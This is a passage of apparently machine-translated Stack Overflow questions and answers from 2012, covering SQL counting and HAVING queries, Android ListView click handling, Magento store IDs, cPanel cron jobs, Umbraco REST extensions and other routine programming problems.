[你可以在这里](https://docs.djangoproject.com/en/dev/ref/models/querysets/#none)找到更多信息

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2018-03-12T06:53:35.617

@radtek 的[评论](https://stackoverflow.com/questions/11243559/create-empty-queryset-by-default-in-django-form-fields#comment36297084_11244370)应该是一个答案，因为它在类似情况下很有用，但方法与接受的答案不同。

> 如果您的查询集随着您视图中的 url 而变化。

我正在用我使用的示例扩展答案：

```
def my_view(request):
    ...
    form = YourForm(initial={'field1':value1, 'field2':value2})
    form.fields['field3'].queryset = YourModel.objects.filter('foo'=bar) 
```

# sql - SQL 一个查询中的多个 select count 语句

> ID：11243561
> 
> 赞同：6
> 
> 时间：2012-06-28T11:25:08.860
> 
> 标签：sql, database, tsql

我有没有关系的数据。只需要计算 3 个表中的各个列，并将它们作为视图显示在页面上。

这是到目前为止的代码，但不起作用：

```
SELECT COUNT(cars) AS A,
       (SELECT COUNT(boats) FROM tableBoats) AS B,
       (SELECT COUNT(trees) FROM tableTrees) AS C,
 FROM tableCars 
```

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-06-28T11:30:14.973

```
SELECT A, B, C
FROM (SELECT COUNT(cars) as A FROM tableCars) a
CROSS JOIN (SELECT COUNT(boats) as B FROM tableBoats) b
CROSS JOIN (SELECT COUNT(trees) as C FROM tableTrees) c 
```

应该这样做。

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2012-06-28T11:52:44.843

假设你有一个像这里这样的表（`tableXxx`表有一个名为的字段`xxx`），你的查询有一个语法错误，因为后面有一个逗号`AS C,`，没有那个逗号，它可以正常工作（至少使用 sqlite，因为 mssql 对我来说在 sqlfiddle 不起作用） ：

[http://sqlfiddle.com/#!5/5fa6c/3](http://sqlfiddle.com/#!5/5fa6c/3)

```
SELECT COUNT(cars) AS A,
       (SELECT COUNT(boats) FROM tableBoats) AS B,
       (SELECT COUNT(trees) FROM tableTrees) AS C
FROM tableCars 
```

顺便说一句，您可以将查询简化为

```
SELECT (SELECT COUNT(cars ) FROM tableCars ) AS A,
       (SELECT COUNT(boats) FROM tableBoats) AS B,
       (SELECT COUNT(trees) FROM tableTrees) AS C 
```

其他答案也很完美:)

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-06-28T11:57:28.470

这个怎么样？

```
SELECT
    (SELECT COUNT(*) FROM tableCars) car_count,
    (SELECT COUNT(*) FROM tableBoats) boat_count,
    (SELECT COUNT(*) FROM tableTrees) tree_count 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-09-09T14:15:19.227

继 Luc M 的响应之后，它提供了一个列表，与具有单独值的列相比。你可以想象这可能有多么有用......

```
SELECT C.Accountnum as AccountNum, C.Address as Address, 'C' as Source 
From CustTable C 
Where C.AccountNum like '000%' 
Union All 
Select V.Accountnum as AccountNum, V.Name as Address, 'V' as Source 
from VendTable V 
Where V.AccountNum like 'A%' 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-06-28T11:36:27.823

```
SELECT *
FROM 
(
   SELECT 'Nb cars'  as description, COUNT(cars)  AS count_item FROM tableCars
   UNION ALL
   SELECT 'Nb boats' as description, COUNT(boats) AS count_item FROM tableBoats
   UNION ALL
   SELECT 'Nb tress' as description, COUNT(trees) AS count_item FROM tableTrees
) temp 
```

# iphone - inputAccessoryView 关闭，但键盘不会？

> ID：11243563
> 
> 赞同：0
> 
> 时间：2012-06-28T11:25:14.743
> 
> 标签：iphone, ipad

我有一个带有`UITextView`“完成”按钮的带有一个，以便用户可以结束编辑过程。在按下 Done 按钮触发的方法中，我调用来关闭键盘。`inputAccessoryView``toolbar``resignFirstResponder``UITextView`

因此，当我点击“完成”时，附件视图消失了，但键盘本身仍然存在。我完全不知道为什么会发生这种情况，或者从哪里开始寻找。此应用程序在装有 iOS 5.1 的 iPad 上运行

有任何想法吗？

谢谢！//斯科特

# java - 未调用来自 PopupWindow 的 Android ListView 的 setOnItemClickListener

> ID：11243564
> 
> 赞同：14
> 
> 时间：2012-06-28T11:25:17.817
> 
> 标签：java, android, popupwindow

我正在尝试从 PopupWindow 显示 ListView。但是当我尝试调用 ListView 的 setOnItemClickListener 时，没有什么可做的。这里是 Java 文件

**PopupWindowActivity.java**

```
public class PopupWindowActivity extends Activity {
    String[] data = { "DATA 1", "DATA 2", "DATA 3", "DATA 4", "DATA 5", "DATA 6" };
    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.a);
    final Button btnOpenPopup = (Button) findViewById(R.id.openpopup);
    btnOpenPopup.setOnClickListener(new Button.OnClickListener() {

        public void onClick(View arg0) {
            LayoutInflater layoutInflater = (LayoutInflater) getBaseContext()
                    .getSystemService(LAYOUT_INFLATER_SERVICE);
            View popupView = layoutInflater.inflate(R.layout.main, null);
            final PopupWindow popupWindow = new PopupWindow(popupView,
                    LayoutParams.WRAP_CONTENT, LayoutParams.WRAP_CONTENT);

            ListView listView = (ListView) popupView.findViewById(R.id.listView1);
            listView.setAdapter(new ArrayAdapter<String>(getApplicationContext(), android.R.layout.simple_list_item_1,data));
            listView.setOnItemClickListener(new AdapterView.OnItemClickListener() {

                public void onItemClick(AdapterView<?> arg0, View arg1,
                        int arg2, long arg3) {
                    // TODO Auto-generated method stub
                    System.out.println("Item Clicked");
                    popupWindow.dismiss();
                }
            });

            popupWindow.showAsDropDown(btnOpenPopup, 20, -5);

        }
    });
} 
```

}

这是第一个xml文件 **a.xml**

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
android:layout_width="fill_parent"
android:layout_height="fill_parent"
android:orientation="vertical" >

<TextView
    android:layout_width="fill_parent"
    android:layout_height="wrap_content"
    android:text="@string/hello" />
<Button
    android:id="@+id/openpopup"
    android:layout_width="fill_parent"
    android:layout_height="wrap_content"
    android:text="Open Popup Window" />

</LinearLayout> 
```

在这里它膨胀 xml 文件 **main.xml**

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
android:layout_width="fill_parent"
android:layout_height="fill_parent"
android:background="@drawable/recording"
android:orientation="vertical" >

<RelativeLayout
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:layout_marginBottom="30sp"
    android:layout_marginLeft="30sp"
    android:layout_marginRight="30sp"
    android:layout_marginTop="100sp" >

    <ListView
        android:id="@+id/listView1"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content"
        android:cacheColorHint="#00000000" >
    </ListView>
</RelativeLayout>

</LinearLayout> 
```

我究竟做错了什么？

谢谢

* * *

## 回答 #1

> 赞同：40
> 
> 时间：2012-06-28T11:58:52.717

只需对您的代码进行一点小小的更改，您的代码就会听到您的列表点击事件

```
final PopupWindow popupWindow = new PopupWindow(popupView,
LayoutParams.WRAP_CONTENT, LayoutParams.WRAP_CONTENT,true); 
```

您忘记在**PopupWindow**构造函数中提及**可聚焦**设置**true 。**

 *** * *

## 回答 #2

> 赞同：5
> 
> 时间：2014-02-13T13:15:18.290

有同样的问题，但在我的情况下`setFocusble(false)`是必需的（在我的情况下 using`ListPopupWindow`不是解决方案，因为项目中的很多东西已经使用了 base`PopupWindow`的功能，包括扩展）。

[如果有人处于同样的情况，这里](https://code.google.com/p/android/issues/detail?id=3414)有一种基于 bug 讨论的解决方法（post #9）

主要思想是，它`ListView`的层次结构仍然接收触摸事件，因此我们可以手动触发`onItemClick()`。

然而，这种方法与 real 的触摸处理并非 100% 相同`ListView`（就像在点击一行时没有选择发光一样），这对我来说目前做得很好。

如果有人对此问题有更精确的解决方案，请分享。

所以，这里是完整`Adapter`的代码，可以在`ListView`里面`PopupWindow`使用`setFocusable(false)`：

私有类 CustomAdapter 扩展 ArrayAdapter {

```
private LayoutInflater mInflater;
private ListView mOwningListView;

public CustomAdapter(Context context, List<String> objects, ListView listView) {
    super(context, android.R.layout.simple_list_item_1, objects);
    mInflater = (LayoutInflater) context.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
    mOwningListView = listView;
}

@Override
public View getView(final int position, View convertView, ViewGroup parent) {
    if (convertView == null) {
        convertView = mInflater.inflate(R.layout.font_pick_row, null);
    }
    // this is the key point of workaround
    convertView.setOnClickListener(new OnClickListener() {

        @Override
        public void onClick(View v) {
            /*
             *  as every row is still receiving their touches
             *  we can use this to manually trigger onItemClick
             *  since it doesn't firing in popupWindow.setFocusable(false)  
             */
            mOwningListView.getOnItemClickListener().onItemClick(mOwningListView, v, position, getItemId(position));

        }
    });
    //... other stuff
    return convertView;
} 
```

}

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-28T11:41:51.410

愿这对你有所帮助。

在按钮 ClickListener 之外声明 listview 并列出 onClickListener。**

# database - 选择查询优化

> ID：11243569
> 
> 赞同：0
> 
> 时间：2012-06-28T11:25:26.297
> 
> 标签：database, sql-server-2008, query-optimization

我有一个带有 ID、日期和其他一些列的大表。ID 是索引和顺序的。

我想在某个日期之后选择所有行。鉴于 ID 是连续的，如果行按 ID 降序排列，一旦第一行未通过日期测试，则无需进行检查。如何利用索引来优化它？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-28T13:14:53.877

你可以这样做：

```
With FirstFailDate AS
(
-- You start by selecting the first fail date
SELECT TOP 1 * FROM YOUR_TABLE WHERE /* DATE TEST FAILING */ ORDER BY ID DESC
)
SELECT *
FROM YOUR_TABLE t
-- Then, you join your table with the first fail date, and get all the records
-- that are before this date (by ID)
JOIN FirstFailDate f
  ON f.ID > t.ID 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-28T11:50:29.890

如果没有实际索引日期，我认为没有一个好的“合法”方法可以做到这一点。

但是，您*可以*尝试这样的事情：

*   向 DBMS 发出以下查询：`SELECT * FROM YOUR_TABLE ORDER BY ID DESC`。
*   开始获取客户端应用程序中的行。
*   取货时，请检查日期。
*   当日期超过限制时停止获取（并关闭光标）。

这个想法是 DBMS 有时不必在开始将部分结果发送到客户端之前完成整个查询。在这种情况下，希望 DBMS 将对 ID 执行索引扫描（由于`ORDER BY ID DESC`），您将能够在*它发生时*获得结果，然后在它完成之前停止它。

*注意：如果您的 DBMS 为您提供了在快速获取第一行与快速获取整个结果之间取得平衡的选项，请选择第一个选项（例如`/*+ FIRST_ROWS */`Oracle 下的提示）。*

当然，对真实数量的数据进行**测量**，以确保这在您的特定情况下确实有效。

# java - 在java中使用字符串初始化的运行时区别是什么？

> ID：11243572
> 
> 赞同：0
> 
> 时间：2012-06-28T11:25:34.730
> 
> 标签：java, performance

我需要知道使用运行时在java中初始化String的区别。

例如：

```
String declare = null; 
```

否则：

```
String declare = ""; 
```

我声明了两种类型的字符串声明。哪一个最适合运行时声明。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-28T11:31:26.663

字符串是一个对象。如果你将它初始化为 null，你就是在告诉编译器你知道它没有被初始化，并且当你第一次尝试使用这个变量时不应该有任何警告。除此之外，当然，您指向的是对 null 的引用。

但是，如果将 String 初始化为空 String，则会发生以下情况：

*   现在分配了一个 String 对象
*   编译器会将该字符串文字放入字符串池中
*   您初始化为 "" 的任何其他字符串都将指向该池中的相同不可变字符串

那么，问题是，如何处理代码中的 null 或空字符串？这应该指导你的决定

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-28T11:32:27.437

在第一种情况下，您创建了一个指向`null`对象的“指针”（未创建对象）。在第二个中 - 指向具有值“”（空字符串）的对象的“指针”。这些是完全不同的事情——你需要决定，你需要哪一个来进行进一步的操作。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-28T11:32:46.640

第一个示例不会创建 String 对象，第二个示例会。所以，声明：

```
declare.equals("some string"); 
```

将为您的第一个示例生成 NullPointerException，但不会为第二个示例生成。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-28T11:32:54.723

正如@AljoshaBre 评论的那样，这取决于您要使用它做什么。将其初始化为 null 有点多余，因为初始值通常就是这样。如果您经过意外的路径（这可能是好的或坏的，因为它可能掩盖代码中的逻辑错误），空白初始化 ("") 将无法接收空指针异常。

有一个初始值通常是好的，但要让它对使用你的字符串的代码有意义，而不是一个随机的初始值。

# php - 如何在 Magento 中获取网站的默认商店 ID？

> ID：11243574
> 
> 赞同：16
> 
> 时间：2012-06-28T11:25:42.150
> 
> 标签：php, magento, magento-1.6

我想获取当前活动网站的默认商店 ID。我试过`Mage::app()->getStoreId()`了，但得到的是当前商店，而不是当前网站的默认商店 ID。

我怎么才能得到它？

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-06-28T14:54:38.057

假设您正在谈论每个商店组定义的默认商店 ID，那么例如：

```
$iDefaultStoreId = Mage::app()
    ->getWebsite()
    ->getDefaultGroup()
    ->getDefaultStoreId(); 
```

最初的问题是关于如何检索当前活动网站的默认商店 ID，所以答案是正确的。但是，为了从管理面板中获取默认的前端商店 ID，您需要将参数传递`true`给方法`getWebsite()`：

```
$iDefaultStoreId = Mage::app()
    ->getWebsite(true)
    ->getDefaultGroup()
    ->getDefaultStoreId(); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2018-09-04T09:57:25.467

您可以获取默认商店 ID，如下所示：

```
Mage_Core_Model_App::ADMIN_STORE_ID 
```

# cron - 如何使用 cpanel cron 作业执行 .sh 脚本

> ID：11243577
> 
> 赞同：5
> 
> 时间：2012-06-28T11:25:48.167
> 
> 标签：cron, cpanel

我对命令行很陌生，所以请原谅我的无知。通过导航到相关目录并键入，我可以使用 putty 成功执行我的脚本

```
bash app_auth.sh 
```

我现在正在尝试将此 scipt 设置为使用 cPanel cron 作业运行。我尝试了以下方法，但它不起作用：

```
*   *   *   *   *   /public_html/app/cron_jobs/app_auth.sh 
```

任何帮助，将不胜感激..

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-06-21T06:17:26.850

虽然这个帖子很旧，但我发现它没有答案，因此回复了。

确保您已为 app_auth.sh 文件分配了执行权限。另外，尝试设置以下 cron：

```
* * * * * /public_html/app/cron_jobs/app_auth.sh > /home/YOUR_USER/cron.log 2>&1 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2016-06-01T14:00:57.190

只是为了记录，我遇到了同样的问题。

我找到[了这个网页，](http://support.hostgator.com/articles/cpanel/what-do-i-put-for-the-cron-job-command)这导致我这样做：

`/bin/sh /public_html/app/cron_jobs/app_auth.sh`

而且效果很好！

# java - 获取局部变量的名称和数据类型

> ID：11243578
> 
> 赞同：1
> 
> 时间：2012-06-28T11:26:04.167
> 
> 标签：java

我有一个 java 代码，它获取函数名称、它们的返回类型、它们的参数以及 java 类的静态变量。现在，我一直在获取 java 类中方法的局部变量的名称和数据类型。如果你们能帮助我，那就太好了...

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-28T11:31:42.023

提取局部变量名称及其类型的唯一方法是在字节码中举例说明调试信息（假设它在那里）。您可以使用 ASM 之类的工具来检查字节码。它比使用反射要困难得多，因此很少这样做。;)

# android - 带有标题和 MergeAdapter 的可点击 ListView 使应用程序崩溃 onListItemClick

> ID：11243579
> 
> 赞同：1
> 
> 时间：2012-06-28T11:26:04.760
> 
> 标签：android, android-listview, commonsware-cwac

我在返回 ListView 或几个 ListView 的组合的活动中遇到问题，该活动与 Commonsware 的 MergeAdapter 合并。它是一种搜索活动，基于搜索查询将返回来自 1 个或多个不同类别的结果。当类别超过1时，我插入一个标题，这是另一个只有一行的ListView - 类别的名称。

一些代码：

```
public class FirstAdapter extends ArrayAdapter<Address> {
public FirstAdapter (Context context, int resource,
        int textViewResourceId, List<Address> objects) {
    super(context, resource, textViewResourceId, objects);
}

public View getView (int position, View convertView, ViewGroup parent) {
    View view = super.getView(position, convertView, parent);
    Address location = this.getItem(position);

    TextView textView = (TextView) view.findViewById(R.id.SearchResultTextAddress);
    textView.setText(location.address);

    return view;
} 
```

}

然后我有一个标头适配器：

```
public class HeaderAdapter extends ArrayAdapter<String> {
private String header;

public HeaderAdapter(Context context, int resource,
        int textViewResourceId, String header) {
    super(context, resource, textViewResourceId, new ArrayList<String>());

    this.header = header;
}

public void setVisible(boolean visible) {
    if (visible) show();
    else hide();
}

public void show() {
    clear();
    add(this.header);
}

public void hide() {
    clear();
}

public View getView (int position, View convertView, ViewGroup parent) {
    return super.getView(position, convertView, parent);
}

public String getHeader() {
    return header;
}

public void setHeader(String header) {
    this.header = header;
}

@Override
public boolean isEnabled(int position) {
    return false;
} 
```

}

如您所见，仅在必要时才会显示。在我的活动中，我有一个 onListItemClick 被覆盖：

```
@Override
protected void onListItemClick(ListView listview, View view, int position, long id) {
    super.onListItemClick(listview, view, position, id);

    if (this.firstAdapter.getCount() > 0) {
        position--;
        if (position < this.firstAdapter.getCount()) onRepClick(this.firstAdapter.getItem(position));
        position = position - this.firstAdapter.getCount();
    }

    if (this.secondAdapter.getCount() > 0) {
        position--;
        if (position < this.secondAdapter.getCount()) onAusschussClick(this.secondHeader.getItem(position));
        position = position - this.secondAdapter.getCount();
    } 
```

因此，当我只有一个适配器中的一个类别时，一切正常。当我得到其中两个结果的那一刻，我得到了一个 ArrayIndexOutOfBoundsException。我认为我获得职位的逻辑是不正确的。任何想法将不胜感激，谢谢。

这是堆栈跟踪：

```
06-28 12:56:54.291: E/AndroidRuntime(3963): FATAL EXCEPTION: main
06-28 12:56:54.291: E/AndroidRuntime(3963): java.lang.ArrayIndexOutOfBoundsException
06-28 12:56:54.291: E/AndroidRuntime(3963):     at java.util.ArrayList.get(ArrayList.java:313)
06-28 12:56:54.291: E/AndroidRuntime(3963):     at android.widget.ArrayAdapter.getItem(ArrayAdapter.java:298)
06-28 12:56:54.291: E/AndroidRuntime(3963):     at com.jasamer.callarep.SearchActivity.onListItemClick(SearchActivity.java:136)
06-28 12:56:54.291: E/AndroidRuntime(3963):     at android.app.ListActivity$2.onItemClick(ListActivity.java:319)
06-28 12:56:54.291: E/AndroidRuntime(3963):     at android.widget.AdapterView.performItemClick(AdapterView.java:284)
06-28 12:56:54.291: E/AndroidRuntime(3963):     at android.widget.ListView.performItemClick(ListView.java:3513)
06-28 12:56:54.291: E/AndroidRuntime(3963):     at android.widget.AbsListView$PerformClick.run(AbsListView.java:1849)
06-28 12:56:54.291: E/AndroidRuntime(3963):     at android.os.Handler.handleCallback(Handler.java:587)
06-28 12:56:54.291: E/AndroidRuntime(3963):     at android.os.Handler.dispatchMessage(Handler.java:92)
06-28 12:56:54.291: E/AndroidRuntime(3963):     at android.os.Looper.loop(Looper.java:130)
06-28 12:56:54.291: E/AndroidRuntime(3963):     at android.app.ActivityThread.main(ActivityThread.java:3835)
06-28 12:56:54.291: E/AndroidRuntime(3963):     at java.lang.reflect.Method.invokeNative(Native Method)
06-28 12:56:54.291: E/AndroidRuntime(3963):     at java.lang.reflect.Method.invoke(Method.java:507)
06-28 12:56:54.291: E/AndroidRuntime(3963):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:847)
06-28 12:56:54.291: E/AndroidRuntime(3963):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:605)
06-28 12:56:54.291: E/AndroidRuntime(3963):     at dalvik.system.NativeStart.main(Native Method) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T20:59:52.060

好吧，解决方案变得不同而且更简单。在 if 语句中，我必须更改：`if (position < this.firstAdapter.getCount())`到以下内容： `if ((position < this.firstAdapter.getCount() && position >= 0))`

通过这种方式，我将确保不可能出现负数，并且无论我有多少标题，索引都将始终正确。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-28T12:12:20.257

我认为你需要一些`else`或`return`逻辑`onListItemClick()`。

假设`position`是`1`，`firstAdapter.getCount()`返回`383`和`secondAdapter.getCount()`返回`27`。您将通过第一个`if`块（`383`大于`0`），从中减去一个`position`（现在是`0`）并处理它。然后，您将通过第二个块（`27`大于`0`），从那里减去一个`position`（现在是`-1`），您将在尝试获取`-1`元素时崩溃。由于只有一行由 标识`position`，因此它只能位于其中一个适配器中，并且您现有的代码无法处理这种情况。

# c# - 从集合项之一通知 ObservableCollection

> ID：11243587
> 
> 赞同：1
> 
> 时间：2012-06-28T11:26:34.867
> 
> 标签：c#

我有一个 C# 集合类，我希望在其中一个集合项发生更改时通知它。这样我就可以更新该集合中的所有项目。最好的方法是什么？

我正在使用 ObservableCollection，因为我将集合绑定到 WPF ListBox。

这是我的收藏类：

```
public class Shows : ObservableCollection<ShowDetails>
{
  ...
} 
```

每个项目类别是：

```
public class Show : INotifyPropertyChanged
{
  ...
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-29T14:01:54.470

我最终在创建时将对集合的引用传递到每个项目中。然后，当我想通知该集合时，我只是在该集合中调用了一个公共函数，然后更新了所有同级项。

不管怎么说，还是要谢谢你。

# liferay - 哪个数据库表存储页面顺序？

> ID：11243597
> 
> 赞同：0
> 
> 时间：2012-06-28T11:27:12.747
> 
> 标签：liferay

页面顺序存储在哪个数据库表中？

我需要为用户获取页面顺序的报告。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-28T13:06:48.000

存储页顺序的数据库表： 确定该表中页顺序的列：**`Layout`**
**`priority`**

创建的所有不同行都将具有相同**`groupId`**的内容，这决定了页面属于同一站点（或社区）。
列还**`privateLayout`**确定这是给定站点的私有页面 ( `column value = 1`) 还是公共页面 ( )。`column value = 0`

希望这可以帮助。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-28T11:32:46.903

页面顺序是什么意思。页面信息存储在布局表中。对于组（社区、组织或用户）的特定集合（公共或私有），顺序由按升序排序的 plid 确定

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2015-07-25T12:09:55.077

您也可以使用 Liferay 提供的 LayoutLocalServiceUtil API，而不是查看数据库。谢谢。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-10-20T13:05:27.563

对于菜单项顺序更改，更改 Liferay SQL 数据库中布局表中的“优先级”字段值。它对我有用。

# flash - 在 GWT 中浮动在闪存上的 div 元素

> ID：11243599
> 
> 赞同：0
> 
> 时间：2012-06-28T11:27:16.487
> 
> 标签：flash, gwt, html, transparent

在我的 GWT 应用程序中，我集成了一个 flash 对象。还有一个 GWT 日历组件。当我打开压光机时，它在闪光灯下。但我希望它出现在闪光灯上方。

我在 embed 标记中添加了 and wmode="transparent"，这是在 chrome 开发控制台中完成的。但它没有用。

那么我是在做正确的事情还是可以用 GWT 压光机做我需要的事情？

谢谢....

# c - cygwin安装后Windows中的gcc库链接问题

> ID：11243606
> 
> 赞同：0
> 
> 时间：2012-06-28T11:27:31.027
> 
> 标签：c, compiler-errors, cygwin

```
C:\slite\1.1>gcc -c ".\src\SDR.c" -o ".\obj\SDR.o" -I".\inc"  
C:\slite\1.1>gcc ".\obj\SDR.o" -o ".\exe\SDR.exe" -L".\lib" -lsres -lshis  
.\lib/sres.dll: file not recognized: File format not recognized  
collect2: ld returned 1 exit status 
```

在 Windows 2003 中安装 cygwin 后无法使用 gcc 编译 C 程序。
在安装 cygwin 之前，我能够编译成功。
我正在从命令提示符编译代码，而不是从 cygwin 终端。
使用的 gcc 来自 Dev-Cpp 发行版。问题是因为 -L 指定的库目录和 -l 指定的各个库之间的目录分隔符（'/'），在安装 cygwin 后被 gcc 使用？

如果我尝试在 cygwin 终端中编译，我会收到未知函数调用错误，尽管函数是在包含的头文件中定义的。

编辑：

```
C:\srmlite\x7.5.0.146-1600>where gcc
C:\Dev-Cpp\bin\gcc.exe 
```

gcc 不是来自 cygwin。我已经卸载了 cygwin 并删除了它的目录。我仍然看到这个问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-02T09:59:22.890

尝试将正确的 bin 目录添加到环境变量的路径中。像这样的东西：**C:\soft\cygwin\bin**

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-02T10:09:23.823

似乎 Cygwin 修改了默认环境，将自身添加到`%PATH%`，所以你实际上是在调用 cygwin 的 gcc，检查一下。

# asp.net - Umbraco：加载文档后渲染服务器端脚本

> ID：11243607
> 
> 赞同：0
> 
> 时间：2012-06-28T11:27:32.713
> 
> 标签：asp.net, razor, umbraco

我有一个基于 .NET 和 Razor 的脚本，它在呈现任何 html 元素之前立即呈现在网页上。除了 MySQL 查询之外，该脚本仅使用以下方式在屏幕上写入一些数据：

```
Response.Write("Some data"); 
```

我正在使用 Umbraco v4.7.2 并希望脚本在整个文档加载后呈现我插入宏的位置。我尝试将我的脚本包装在一个事件处理程序中，类似于以下内容，但这无法识别并导致整个脚本呈现为文本：

```
protected void Page_LoadComplete(object sender, EventArgs e)  {
    Response.Write("Page Load Complete!");
} 
```

事件处理程序似乎经常使用，但我不太了解 Umbraco 文档，我需要在我的 razor 脚本中引用一些东西才能渲染它们吗？是否有我需要参考的“cs”文件？

我也尝试过使用“RenderEvent”属性，根据我的脚本，它似乎没有做任何事情。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T14:35:40.927

Umbraco 事件主要用于处理 API 时；当文档被保存、发布、删除等时。

使用不同的方法，您可以构建一个 Umbraco 基类，然后在加载时使用 Javascript AJAX 调用将结果拉下来。Umbraco 基础允许您快速构建允许您通过 API 访问 Umbraco 的 REST 扩展。

这是一个示例基类：

```
using umbraco.presentation.umbracobase;

namespace BaseExample
{
    [RestExtension("MyAlias")]
    public class TestClass
    {
        [RestExtensionMethod(allowAll = true)]
        public static string GetData()
        {
            return "Some data";
        }
    }
} 
```

更详细的说明可以在[Umbraco wiki](http://our.umbraco.org/wiki/reference/umbraco-base/simple-base-samples)中找到。将基类的 DLL 放入`bin`目录后，您可以通过导航到`http://[domain]/base/MyAlias/GetData`. 默认情况下，该方法将返回 XML，但为了更轻松地将其与 Javascript 集成，您可以让它返回 JSON。查看[此 SO 答案](https://stackoverflow.com/a/10033483/1110395)以获取更多详细信息。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-25T08:22:15.513

我终于找到了最简单的解决方案；使用 @Html.Raw() 而不是 Response.Write("Some data") 做了我需要做的事情。

# php - abraham 的 twitteroauth 库是否适用于 update_with_media？

> ID：11243612
> 
> 赞同：2
> 
> 时间：2012-06-28T11:28:11.453
> 
> 标签：php, twitter, twitter-oauth

abraham 的 twitteroauth 库是否适用于 update_with_media？

我正在使用下面的代码，但它返回给我 stdClass 对象（ [request] => /1/statuses/update_with_media.json [error] => 创建状态时出错。）

```
session_start();
require_once('twitteroauth/twitteroauth.php');
require_once('config.php');

if (empty($_SESSION['access_token']) || empty($_SESSION['access_token']['oauth_token']) || empty($_SESSION['access_token']['oauth_token_secret'])) {
  header('Location: ./clearsessions.php');
}

 $connection = new TwitterOAuth(CONSUMER_KEY, CONSUMER_SECRET,$_SESSION['access_token']['oauth_token'], $_SESSION['access_token']['oauth_token_secret']);

$image = './images/5298.png';
$content = $connection->post('statuses/update_with_media', 
  array(
   'media[]' => '@{$image};type=image/jpeg;filename={$image}', 
   'status' => 'My current location'));

include('html.inc'); 
```

有人知道如何解决这个问题吗？

**编辑 1：**我使用[https://upload.twitter.com/1/](https://upload.twitter.com/1/)作为 url

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-05-02T13:50:14.427

是的，它确实！[按照此链接https://github.com/robhaswell/twitteroauth/commit/7f5bfd2450cb1cff71641d7ea55e118f5a42885d](https://github.com/robhaswell/twitteroauth/commit/7f5bfd2450cb1cff71641d7ea55e118f5a42885d)中的描述更改两个文件 Oauth.php 和 twitteroauth.php并使用 $connection->upload 方法，如下所示。

```
 $params = array('media[]' => '@'.$image_url, 'status' => $messafe);
 $twit = $connection->upload('statuses/update_with_media',$params); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-03T12:45:43.410

根据图书馆作者在其他地方的回答 - 不，它还不能与 update_with_media 一起使用。

> TwitterOAuth 目前不支持媒体上传。我希望在未来增加支持。5 月 10 日 @abraham 在 update_with_media[使用 abraham 的 twitteroauth](https://stackoverflow.com/questions/10530385/update-with-media-using-abrahams-twitteroauth)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-10-30T09:59:35.033

```
 $params = array('media[]' => file_get_contents($image_url), 'status' => $messafe);
 $twit = $connection->upload('statuses/update_with_media',$params); 
```

如果 update_with_media 不起作用，请稍作改动

# sql - SQL 有子句来选择具有布尔标志的两种状态的记录

> ID：11243613
> 
> 赞同：0
> 
> 时间：2012-06-28T11:28:13.177
> 
> 标签：sql, group-by, having

我有一个 schedule_item 表，我可以在其中安排要显示的动画。

播放动画后，它的属性 is_played 设置为 true。

当所有动画都播放完后，调度器将之前显示的动画添加到队列中，所以屏幕总是播放一些动画。

当新动画到达时，它需要在队列之前添加 - 理想情况下替换下一个要播放的项目。

schedule_item 如下所示：

```
CREATE TABLE scheduled_item (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `animation_id` bigint(20) DEFAULT NULL,
  `is_played` tinyint(1) NOT NULL DEFAULT '0'
); 
```

有些行可能看起来像这样

```
+----+--------------+-----------+
| id | animation_id | is_played |
+----+--------------+-----------+                                           
| 17 |           15 |         1 |
| 40 |           22 |         1 |
| 43 |           26 |         1 |
| 46 |           15 |         1 |
| 49 |           22 |         0 |
+----+--------------+-----------+ 
```

所以，我试图获取所有尚未播放但过去播放过的动画的 id。在这种情况下，我正在寻找 id 49 / animation_id 22。

所以这就是我想出的，它似乎正在工作，但是：

```
SELECT item_id
FROM scheduled_item
GROUP BY animation_id
HAVING count( animation_id ) > 1
AND MIN( is_played ) < 1
AND MAX( is_played ) > 0
ORDER BY id ASC; 
```

*   有更好的方法吗？
*   我得到正确的结果了吗？

* * *

## 回答 #1

> 赞同：1
> 
